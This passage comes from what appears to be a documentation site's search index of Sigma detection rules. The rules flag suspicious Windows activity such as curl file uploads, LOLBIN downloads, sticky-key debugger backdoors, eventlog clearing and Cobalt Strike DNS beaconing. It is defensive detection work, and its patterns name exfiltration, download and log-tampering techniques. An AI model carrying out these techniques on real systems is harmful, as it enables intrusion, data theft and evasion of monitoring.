https://twitter.com/ItsReallyNick/status/1094080242686312448 Raw rule (edit) title: Suspicious Calculator Usage id: 737e618a-a410-49b5-bec3-9e55ff7fbc15 status: test description: Detects suspicious use of calc.exe with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion author: Florian Roth references: - https://twitter.com/ItsReallyNick/status/1094080242686312448 date: 2019/02/09 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: \u0026#39;\\calc.exe \u0026#39; selection2: Image|endswith: \u0026#39;\\calc.exe\u0026#39; filter2: Image|contains: \u0026#39;\\Windows\\Sys\u0026#39; condition: selection1 or ( selection2 and not filter2 ) falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1036 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_calc.yml/","tags":["attack.defense_evasion","attack.t1036"],"title":"Suspicious Calculator Usage"},{"categories":null,"contents":"Detects Processes accessing the camera and microphone from suspicious folder\nKnown false-positives Unlikely, there could be conferencing software running from a Temp folder accessing the devices References https://medium.com/@7a616368/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072 Raw rule (edit) title: Suspicious Camera and Microphone Access id: 62120148-6b7a-42be-8b91-271c04e281a3 description: Detects Processes accessing the camera and microphone from suspicious folder status: experimental author: Den Iuzvyk date: 2020/06/07 modified: 2021/09/17 references: - https://medium.com/@7a616368/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072 tags: - attack.collection - attack.t1125 - attack.t1123 logsource: category: registry_event product: windows detection: selection_1: TargetObject|contains|all: - \u0026#39;\\Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\\u0026#39; - \u0026#39;\\NonPackaged\u0026#39; selection_2: TargetObject|contains: - microphone - webcam selection_3: TargetObject|contains: - \u0026#39;:#Windows#Temp#\u0026#39; - \u0026#39;:#$Recycle.bin#\u0026#39; - \u0026#39;:#Temp#\u0026#39; - \u0026#39;:#Users#Public#\u0026#39; - \u0026#39;:#Users#Default#\u0026#39; - \u0026#39;:#Users#Desktop#\u0026#39; condition: all of selection_* falsepositives: - Unlikely, there could be conferencing software running from a Temp folder accessing the devices level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_susp_mic_cam_access.yml/","tags":["attack.collection","attack.t1125","attack.t1123"],"title":"Suspicious Camera and Microphone Access"},{"categories":null,"contents":"Detects a program that invoked suspicious DNS queries known from Cobalt Strike beacons\nKnown false-positives Unknown References https://www.icebrg.io/blog/footprints-of-fin7-tracking-actor-patterns https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/ Raw rule (edit) title: Suspicious Cobalt Strike DNS Beaconing id: f356a9c4-effd-4608-bbf8-408afd5cd006 status: experimental description: Detects a program that invoked suspicious DNS queries known from Cobalt Strike beacons author: Florian Roth date: 2021/11/09 references: - https://www.icebrg.io/blog/footprints-of-fin7-tracking-actor-patterns - https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/ tags: - attack.command_and_control - attack.t1071.004 logsource: product: windows category: dns_query detection: selection1: QueryName|startswith: - \u0026#39;aaa.stage.\u0026#39; - \u0026#39;post.1\u0026#39; selection2: QueryName|contains: \u0026#39;.stage.123456.\u0026#39; condition: 1 of selection* fields: - Image - CommandLine falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/dns_query/dns_query_win_mal_cobaltstrike.yml/","tags":["attack.command_and_control","attack.t1071.004"],"title":"Suspicious Cobalt Strike DNS Beaconing"},{"categories":null,"contents":"Detects a suspicious copy command that copies a system program from System32 to another directory on disk - sometimes used to use LOLBINs like certutil or desktopimgdownldr to a different location with a different name\nKnown false-positives False positives depend on scripts and administrative tools used in the monitored environment Admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/ False positive when cmd.exe and xcopy.exe are called directly References https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120 Raw rule (edit) title: Suspicious Copy From or To System32 id: fff9d2b7-e11c-4a69-93d3-40ef66189767 status: test description: Detects a suspicious copy command that copies a system program from System32 to another directory on disk - sometimes used to use LOLBINs like certutil or desktopimgdownldr to a different location with a different name author: Florian Roth, Markus Neis, Tim Shelton (HAWK.IO) references: - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120 date: 2020/07/03 modified: 2021/12/30 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - \u0026#39;xcopy*\\System32\\\u0026#39; - \u0026#39;cmd.exe*/c*copy*\\System32\\\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment - Admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/ - False positive when cmd.exe and xcopy.exe are called directly # C:\\Windows\\System32\\cmd.exe /c copy file1 file2 level: medium tags: - attack.defense_evasion - attack.t1036.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_copy_system32.yml/","tags":["attack.defense_evasion","attack.t1036.003"],"title":"Suspicious Copy From or To System32"},{"categories":null,"contents":"Detects a suspicious curl process start the adds a file to a web request\nKnown false-positives Scripts created by developers and admins References https://twitter.com/d1r4c/status/1279042657508081664 https://medium.com/@petehouston/upload-files-with-curl-93064dcccc76 https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md#atomic-test-19---curl-upload-file https://curl.se/docs/manpage.html Raw rule (edit) title: Suspicious Curl File Upload id: 00bca14a-df4e-4649-9054-3f2aa676bc04 status: test description: Detects a suspicious curl process start the adds a file to a web request author: Florian Roth references: - https://twitter.com/d1r4c/status/1279042657508081664 - https://medium.com/@petehouston/upload-files-with-curl-93064dcccc76 - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md#atomic-test-19---curl-upload-file - https://curl.se/docs/manpage.html date: 2020/07/03 modified: 2022/01/22 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\curl.exe\u0026#39; CommandLine|contains: - \u0026#39; -F \u0026#39; - \u0026#39; -T \u0026#39; - \u0026#39; --upload-file \u0026#39; - \u0026#39; -d \u0026#39; - \u0026#39; --data \u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Scripts created by developers and admins level: medium tags: - attack.exfiltration - attack.t1567 - attack.t1105 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_curl_fileupload.yml/","tags":["attack.exfiltration","attack.t1567","attack.t1105"],"title":"Suspicious Curl File Upload"},{"categories":null,"contents":"Detects a suspicious curl process start on Windows and outputs the requested document to a local file\nKnown false-positives Scripts created by developers and admins Administrative activity References https://twitter.com/reegun21/status/1222093798009790464 Raw rule (edit) title: Suspicious Curl Usage on Windows id: e218595b-bbe7-4ee5-8a96-f32a24ad3468 status: test description: Detects a suspicious curl process start on Windows and outputs the requested document to a local file author: Florian Roth references: - https://twitter.com/reegun21/status/1222093798009790464 date: 2020/07/03 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: \u0026#39;\\curl.exe\u0026#39; selection2: Product: \u0026#39;The curl executable\u0026#39; selection3: CommandLine|contains: \u0026#39; -O \u0026#39; condition: ( selection1 or selection2 ) and selection3 fields: - CommandLine - ParentCommandLine falsepositives: - Scripts created by developers and admins - Administrative activity level: medium tags: - attack.command_and_control - attack.t1105 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_curl_download.yml/","tags":["attack.command_and_control","attack.t1105"],"title":"Suspicious Curl Usage on Windows"},{"categories":null,"contents":"Detects the registration of a debugger for a program that is available in the logon screen (sticky key backdoor).\nKnown false-positives Penetration Tests References https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/ Raw rule (edit) title: Suspicious Debugger Registration Cmdline id: ae215552-081e-44c7-805f-be16f975c8a2 status: test description: Detects the registration of a debugger for a program that is available in the logon screen (sticky key backdoor). author: Florian Roth, oscd.community, Jonhnathan Ribeiro references: - https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/ date: 2019/09/06 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;\\CurrentVersion\\Image File Execution Options\\\u0026#39; CommandLine|contains: - \u0026#39;sethc.exe\u0026#39; - \u0026#39;utilman.exe\u0026#39; - \u0026#39;osk.exe\u0026#39; - \u0026#39;magnify.exe\u0026#39; - \u0026#39;narrator.exe\u0026#39; - \u0026#39;displayswitch.exe\u0026#39; - \u0026#39;atbroker.exe\u0026#39; condition: selection falsepositives: - Penetration Tests level: high tags: - attack.persistence - attack.privilege_escalation - attack.t1546.008 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_install_reg_debugger_backdoor.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.t1546.008"],"title":"Suspicious Debugger Registration Cmdline"},{"categories":null,"contents":"Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet\nKnown false-positives False positives depend on scripts and administrative tools used in the monitored environment References https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/ https://twitter.com/SBousseaden/status/1278977301745741825 Raw rule (edit) title: Suspicious Desktopimgdownldr Command id: bb58aa4a-b80b-415a-a2c0-2f65a4c81009 status: test description: Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet author: Florian Roth references: - https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/ - https://twitter.com/SBousseaden/status/1278977301745741825 date: 2020/07/03 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: \u0026#39; /lockscreenurl:\u0026#39; selection1_filter: CommandLine|contains: - \u0026#39;.jpg\u0026#39; - \u0026#39;.jpeg\u0026#39; - \u0026#39;.png\u0026#39; selection_reg: CommandLine|contains|all: - \u0026#39;reg delete\u0026#39; - \u0026#39;\\PersonalizationCSP\u0026#39; condition: ( selection1 and not selection1_filter ) or selection_reg fields: - CommandLine - ParentCommandLine falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: high tags: - attack.command_and_control - attack.t1105 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_desktopimgdownldr.yml/","tags":["attack.command_and_control","attack.t1105"],"title":"Suspicious Desktopimgdownldr Command"},{"categories":null,"contents":"Detects a suspicious Microsoft desktopimgdownldr file creation that stores a file to a suspicious location or contains a file with a suspicious extension\nKnown false-positives False positives depend on scripts and administrative tools used in the monitored environment References https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/ https://twitter.com/SBousseaden/status/1278977301745741825 Raw rule (edit) title: Suspicious Desktopimgdownldr Target File id: fc4f4817-0c53-4683-a4ee-b17a64bc1039 status: test description: Detects a suspicious Microsoft desktopimgdownldr file creation that stores a file to a suspicious location or contains a file with a suspicious extension author: Florian Roth references: - https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/ - https://twitter.com/SBousseaden/status/1278977301745741825 date: 2020/07/03 modified: 2021/11/27 logsource: product: windows category: file_event detection: selection: Image|endswith: svchost.exe TargetFilename|contains: \u0026#39;\\Personalization\\LockScreenImage\\\u0026#39; filter1: TargetFilename|contains: \u0026#39;C:\\Windows\\\u0026#39; filter2: TargetFilename|contains: - \u0026#39;.jpg\u0026#39; - \u0026#39;.jpeg\u0026#39; - \u0026#39;.png\u0026#39; condition: selection and not filter1 and not filter2 fields: - CommandLine - ParentCommandLine falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: high tags: - attack.defense_evasion - attack.t1105 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_susp_desktopimgdownldr_file.yml/","tags":["attack.defense_evasion","attack.t1105"],"title":"Suspicious Desktopimgdownldr Target File"},{"categories":null,"contents":"Detects DNS queries for ip lookup services such as api.ipify.org not originating from a browser process.\nKnown false-positives Legitimate usage of ip lookup services such as ipify API References https://www.binarydefense.com/analysis-of-hancitor-when-boring-begets-beacon https://twitter.com/neonprimetime/status/1436376497980428318 Raw rule (edit) title: Suspicious DNS Query for IP Lookup Service APIs id: ec82e2a5-81ea-4211-a1f8-37a0286df2c2 description: Detects DNS queries for ip lookup services such as api.ipify.org not originating from a browser process. status: experimental date: 2021/07/08 modified: 2021/09/10 author: Brandon George (blog post), Thomas Patzke (rule) references: - https://www.binarydefense.com/analysis-of-hancitor-when-boring-begets-beacon - https://twitter.com/neonprimetime/status/1436376497980428318 tags: - attack.reconnaissance - attack.t1590 falsepositives: - Legitimate usage of ip lookup services such as ipify API level: medium logsource: product: windows category: dns_query detection: dns_request: QueryName: - canireachthe.net - ipv4.icanhazip.com - ip.anysrc.net - edns.ip-api.com - wtfismyip.com - checkip.dyndns.org - api.2ip.ua - icanhazip.com - api.ipify.org - ip-api.com - checkip.amazonaws.com - ipecho.net - ipinfo.io - ipv4bot.whatismyipaddress.com - freegeoip.app browser_process: Image|endswith: - \\chrome.exe - \\iexplore.exe - \\firefox.exe - \\brave.exe - \\opera.exe - \\msedge.exe - \\vivaldi.exe condition: dns_request and not browser_process ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/dns_query/dns_query_win_susp_ipify.yml/","tags":["attack.reconnaissance","attack.t1590"],"title":"Suspicious DNS Query for IP Lookup Service APIs"},{"categories":null,"contents":"The DNS Z flag is bit within the DNS protocol header that is, per the IETF design, meant to be used reserved (unused). Although recently it has been used in DNSSec, the value being set to anything other than 0 should be rare. Otherwise if it is set to non 0 and DNSSec is being used, then excluding the legitimate domains is low effort and high reward. Determine if multiple of these files were accessed in a short period of time to further enhance the possibility of seeing if this was a one off or the possibility of larger sensitive file gathering. This Sigma query is designed to accompany the Corelight Threat Hunting Guide, which can be found here: https://www3.corelight.com/corelights-introductory-guide-to-threat-hunting-with-zeek-bro-logs\nKnown false-positives Internal or legitimate external domains using DNSSec. Verify if these are legitimate DNSSec domains and then exclude them. If you work in a Public Sector then it may be good to exclude things like endswith \u0026ldquo;.edu\u0026rdquo;, \u0026ldquo;.gov\u0026rdquo; and or \u0026ldquo;.mil\u0026rdquo; References https://twitter.com/neu5ron/status/1346245602502443009 https://tdm.socprime.com/tdm/info/eLbyj4JjI15v#sigma https://tools.ietf.org/html/rfc2929#section-2.1 https://www.netresec.com/?page=Blog\u0026amp;month=2021-01\u0026amp;post=Finding-Targeted-SUNBURST-Victims-with-pDNS Raw rule (edit) title: Suspicious DNS Z Flag Bit Set id: ede05abc-2c9e-4624-9944-9ff17fdc0bf5 description: \u0026#39;The DNS Z flag is bit within the DNS protocol header that is, per the IETF design, meant to be used reserved (unused). Although recently it has been used in DNSSec, the value being set to anything other than 0 should be rare. Otherwise if it is set to non 0 and DNSSec is being used, then excluding the legitimate domains is low effort and high reward. Determine if multiple of these files were accessed in a short period of time to further enhance the possibility of seeing if this was a one off or the possibility of larger sensitive file gathering. This Sigma query is designed to accompany the Corelight Threat Hunting Guide, which can be found here: https://www3.corelight.com/corelights-introductory-guide-to-threat-hunting-with-zeek-bro-logs\u0026#39; status: experimental date: 2021/05/04 modified: 2022/02/24 references: - \u0026#39;https://twitter.com/neu5ron/status/1346245602502443009\u0026#39; - \u0026#39;https://tdm.socprime.com/tdm/info/eLbyj4JjI15v#sigma\u0026#39; - \u0026#39;https://tools.ietf.org/html/rfc2929#section-2.1\u0026#39; - \u0026#39;https://www.netresec.com/?page=Blog\u0026amp;month=2021-01\u0026amp;post=Finding-Targeted-SUNBURST-Victims-with-pDNS\u0026#39; author: \u0026#39;@neu5ron, SOC Prime Team, Corelight\u0026#39; tags: - attack.t1095 - attack.t1571 - attack.command_and_control logsource: product: zeek service: dns detection: z_flag_unset: Z: \u0026#39;0\u0026#39; most_probable_valid_domain: query|contains: \u0026#39;.\u0026#39; exclude_tlds: query|endswith: - \u0026#39;.arpa\u0026#39; - \u0026#39;.local\u0026#39; - \u0026#39;.ultradns.net\u0026#39; - \u0026#39;.twtrdns.net\u0026#39; - \u0026#39;.azuredns-prd.info\u0026#39; - \u0026#39;.azure-dns.com\u0026#39; - \u0026#39;.azuredns-ff.info\u0026#39; - \u0026#39;.azuredns-ff.org\u0026#39; - \u0026#39;.azuregov-dns.org\u0026#39; exclude_query_types: qtype_name: - \u0026#39;NS\u0026#39; - \u0026#39;ns\u0026#39; - \u0026#39;MX\u0026#39; - \u0026#39;mx\u0026#39; exclude_responses: answers|endswith: \u0026#39;\\\\x00\u0026#39; exclude_netbios: id.resp_p: - \u0026#39;137\u0026#39; - \u0026#39;138\u0026#39; - \u0026#39;139\u0026#39; condition: not z_flag_unset and most_probable_valid_domain and not (exclude_tlds or exclude_query_types or exclude_responses or exclude_netbios) falsepositives: - \u0026#39;Internal or legitimate external domains using DNSSec. Verify if these are legitimate DNSSec domains and then exclude them.\u0026#39; - \u0026#39;If you work in a Public Sector then it may be good to exclude things like endswith \u0026#34;.edu\u0026#34;, \u0026#34;.gov\u0026#34; and or \u0026#34;.mil\u0026#34;\u0026#39; level: medium fields: - ts - id.orig_h - id.orig_p - id.resp_h - id.resp_p - proto - qtype_name - qtype - query - answers - rcode - rcode_name - trans_id - qtype - ttl - AA - uid ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_dns_suspicious_zbit_flag.yml/","tags":["attack.t1095","attack.t1571","attack.command_and_control"],"title":"Suspicious DNS Z Flag Bit Set"},{"categories":null,"contents":"Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model\nKnown false-positives Administrator PowerShell scripts References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md Raw rule (edit) title: Suspicious Download File Extension with Bits id: b85e5894-9b19-4d86-8c87-a2f3b81f0521 status: experimental description: | Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md author: frack113 date: 2022/03/01 logsource: product: windows service: bits-client detection: selection: EventID: 16403 LocalName|endswith: - \u0026#39;.ps1\u0026#39; - \u0026#39;.exe\u0026#39; condition: selection falsepositives: - Administrator PowerShell scripts level: low tags: - attack.defense_evasion - attack.persistence - attack.t1197 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/bits_client/win_bits_client_susp_local_file.yml/","tags":["attack.defense_evasion","attack.persistence","attack.t1197"],"title":"Suspicious Download File Extension with Bits"},{"categories":null,"contents":"Detects the loading of drivers via \u0026lsquo;SeLoadDriverPrivilege\u0026rsquo; required to load or unload a device driver. With this privilege, the user can dynamically load and unload device drivers or other code in to kernel mode. This user right does not apply to Plug and Play device drivers. If you exclude privileged users/admins and processes, which are allowed to do so, you are maybe left with bad programs trying to load malicious kernel drivers. This will detect Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs) and the usage of Sysinternals and various other tools. So you have to work with a whitelist to find the bad stuff.\nKnown false-positives Other legimate tools loading drivers. There are some: Sysinternals, CPU-Z, AVs etc. - but not much. You have to baseline this according to your used products and allowed tools. Also try to exclude users, which are allowed to load drivers. References https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/ https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4673 Raw rule (edit) title: Suspicious Driver Loaded By User id: f63508a0-c809-4435-b3be-ed819394d612 status: test description: Detects the loading of drivers via \u0026#39;SeLoadDriverPrivilege\u0026#39; required to load or unload a device driver. With this privilege, the user can dynamically load and unload device drivers or other code in to kernel mode. This user right does not apply to Plug and Play device drivers. If you exclude privileged users/admins and processes, which are allowed to do so, you are maybe left with bad programs trying to load malicious kernel drivers. This will detect Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs) and the usage of Sysinternals and various other tools. So you have to work with a whitelist to find the bad stuff. author: xknow (@xknow_infosec), xorxes (@xor_xes) references: - https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/ - https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4673 date: 2019/04/08 modified: 2021/11/30 logsource: product: windows service: security detection: selection_1: Provider_Name: Microsoft-Windows-Security-Auditing EventID: 4673 PrivilegeList: \u0026#39;SeLoadDriverPrivilege\u0026#39; Service: \u0026#39;-\u0026#39; filter: ProcessName|endswith: - \u0026#39;\\Windows\\System32\\Dism.exe\u0026#39; - \u0026#39;\\Windows\\System32\\rundll32.exe\u0026#39; - \u0026#39;\\Windows\\System32\\fltMC.exe\u0026#39; - \u0026#39;\\Windows\\HelpPane.exe\u0026#39; - \u0026#39;\\Windows\\System32\\mmc.exe\u0026#39; - \u0026#39;\\Windows\\System32\\svchost.exe\u0026#39; - \u0026#39;\\Windows\\System32\\wimserv.exe\u0026#39; - \u0026#39;\\procexp64.exe\u0026#39; - \u0026#39;\\procexp.exe\u0026#39; - \u0026#39;\\procmon64.exe\u0026#39; - \u0026#39;\\procmon.exe\u0026#39; - \u0026#39;\\Google\\Chrome\\Application\\chrome.exe\u0026#39; condition: selection_1 and not filter falsepositives: - \u0026#39;Other legimate tools loading drivers. There are some: Sysinternals, CPU-Z, AVs etc. - but not much. You have to baseline this according to your used products and allowed tools. Also try to exclude users, which are allowed to load drivers.\u0026#39; level: medium tags: - attack.defense_evasion - attack.t1562.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_user_driver_loaded.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Suspicious Driver Loaded By User"},{"categories":null,"contents":"Detects suspicious encoded payloads in WMI Event Consumers\nKnown false-positives Unknown References https://github.com/RiccardoAncarani/LiquidSnake Raw rule (edit) title: Suspicious Encoded Scripts in a WMI Consumer id: 83844185-1c5b-45bc-bcf3-b5bf3084ca5b status: experimental description: Detects suspicious encoded payloads in WMI Event Consumers author: Florian Roth references: - https://github.com/RiccardoAncarani/LiquidSnake date: 2021/09/01 tags: - attack.execution - attack.t1047 - attack.persistence - attack.t1546.003 logsource: product: windows category: wmi_event detection: selection_destination: Destination|base64offset|contains: - \u0026#39;WriteProcessMemory\u0026#39; - \u0026#39;This program cannot be run in DOS mode\u0026#39; - \u0026#39;This program must be run under Win32\u0026#39; condition: selection_destination fields: - User - Operation falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/wmi_event/sysmon_wmi_susp_encoded_scripts.yml/","tags":["attack.execution","attack.t1047","attack.persistence","attack.t1546.003"],"title":"Suspicious Encoded Scripts in a WMI Consumer"},{"categories":null,"contents":"Detects flags often used with the LOLBAS Esentutl for malicious activity. It could be used in rare cases by administrators to access locked files or during maintenance.\nKnown false-positives Administrative activity References https://lolbas-project.github.io/ https://twitter.com/chadtilbury/status/1264226341408452610 Raw rule (edit) title: Suspicious Esentutl Use id: 56a8189f-11b2-48c8-8ca7-c54b03c2fbf7 status: deprecated description: Detects flags often used with the LOLBAS Esentutl for malicious activity. It could be used in rare cases by administrators to access locked files or during maintenance. author: Florian Roth date: 2020/05/23 references: - https://lolbas-project.github.io/ - https://twitter.com/chadtilbury/status/1264226341408452610 tags: - attack.defense_evasion - attack.execution - attack.s0404 - attack.t1218 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39; /vss \u0026#39; - \u0026#39; /y \u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Administrative activity level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/deprecated/win_susp_esentutl_activity.yml/","tags":["attack.defense_evasion","attack.execution","attack.s0404","attack.t1218"],"title":"Suspicious Esentutl Use"},{"categories":null,"contents":"Detects clearing or configuration of eventlogs using wevtutil, powershell and wmic. Might be used by ransomwares during the attack (seen by NotPetya and others).\nKnown false-positives Admin activity Scripts and administrative tools used in the monitored environment References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.001/T1070.001.md https://eqllib.readthedocs.io/en/latest/analytics/5b223758-07d6-4100-9e11-238cfdd0fe97.html Raw rule (edit) title: Suspicious Eventlog Clear or Configuration Using Wevtutil id: cc36992a-4671-4f21-a91d-6c2b72a2edf5 status: test description: Detects clearing or configuration of eventlogs using wevtutil, powershell and wmic. Might be used by ransomwares during the attack (seen by NotPetya and others). author: Ecco, Daniil Yugoslavskiy, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.001/T1070.001.md - https://eqllib.readthedocs.io/en/latest/analytics/5b223758-07d6-4100-9e11-238cfdd0fe97.html date: 2019/09/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_wevtutil_binary: Image|endswith: \u0026#39;\\wevtutil.exe\u0026#39; selection_wevtutil_command: CommandLine|contains: - \u0026#39;clear-log\u0026#39; # clears specified log - \u0026#39; cl \u0026#39; # short version of \u0026#39;clear-log\u0026#39; - \u0026#39;set-log\u0026#39; # modifies config of specified log. could be uset to set it to a tiny size - \u0026#39; sl \u0026#39; # short version of \u0026#39;set-log\u0026#39; selection_other_ps: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|contains: - \u0026#39;Clear-EventLog\u0026#39; - \u0026#39;Remove-EventLog\u0026#39; - \u0026#39;Limit-EventLog\u0026#39; selection_other_wmic: Image|endswith: \u0026#39;\\wmic.exe\u0026#39; CommandLine|contains: \u0026#39; ClearEventLog \u0026#39; condition: 1 of selection_other_* or (selection_wevtutil_binary and selection_wevtutil_command) falsepositives: - Admin activity - Scripts and administrative tools used in the monitored environment level: high tags: - attack.defense_evasion - attack.t1070.001 - car.2016-04-002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_eventlog_clear.yml/","tags":["attack.defense_evasion","attack.t1070.001","car.2016-04-002"],"title":"Suspicious Eventlog Clear or Configuration Using Wevtutil"},{"categories":null,"contents":"Detects EnableUnsafeClientMailRules used for Script Execution from Outlook\nKnown false-positives unknown References https://github.com/sensepost/ruler https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html Raw rule (edit) title: Suspicious Execution from Outlook id: e212d415-0e93-435f-9e1a-f29005bb4723 status: test description: Detects EnableUnsafeClientMailRules used for Script Execution from Outlook author: Markus Neis references: - https://github.com/sensepost/ruler - https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html date: 2018/12/27 modified: 2022/01/07 logsource: category: process_creation product: windows detection: clientMailRules: CommandLine|contains: \u0026#39;EnableUnsafeClientMailRules\u0026#39; outlookExec: ParentImage|endswith: \u0026#39;\\outlook.exe\u0026#39; CommandLine|contains|all: - \u0026#39;\\\\\\\\\u0026#39; - \u0026#39;\\\\\u0026#39; - \u0026#39;.exe\u0026#39; condition: clientMailRules or outlookExec falsepositives: - unknown level: high tags: - attack.execution - attack.t1059 - attack.t1202 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_outlook.yml/","tags":["attack.execution","attack.t1059","attack.t1202"],"title":"Suspicious Execution from Outlook"},{"categories":null,"contents":"This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks Python 3 and python.exe must be installed, Usee to Query/modify DNS records for Active Directory integrated DNS via LDAP\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md#atomic-test-9---remote-system-discovery---adidnsdump Raw rule (edit) title: Suspicious Execution of Adidnsdump id: 26d3f0a2-f514-4a3f-a8a7-e7e48a8d9160 status: experimental description: | This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks Python 3 and python.exe must be installed, Usee to Query/modify DNS records for Active Directory integrated DNS via LDAP author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md#atomic-test-9---remote-system-discovery---adidnsdump date: 2022/01/01 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\python.exe CommandLine|contains: adidnsdump condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1018 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_adidnsdump.yml/","tags":["attack.discovery","attack.t1018"],"title":"Suspicious Execution of Adidnsdump"},{"categories":null,"contents":"Use of hostname to get information\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-6---hostname-discovery-windows https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/hostname Raw rule (edit) title: Suspicious Execution of Hostname id: 7be5fb68-f9ef-476d-8b51-0256ebece19e status: experimental description: Use of hostname to get information author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-6---hostname-discovery-windows - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/hostname date: 2022/01/01 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\HOSTNAME.EXE condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1082 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_hostname.yml/","tags":["attack.discovery","attack.t1082"],"title":"Suspicious Execution of Hostname"},{"categories":null,"contents":"Commandline to lauch powershell with a base64 payload\nKnown false-positives Unknown References 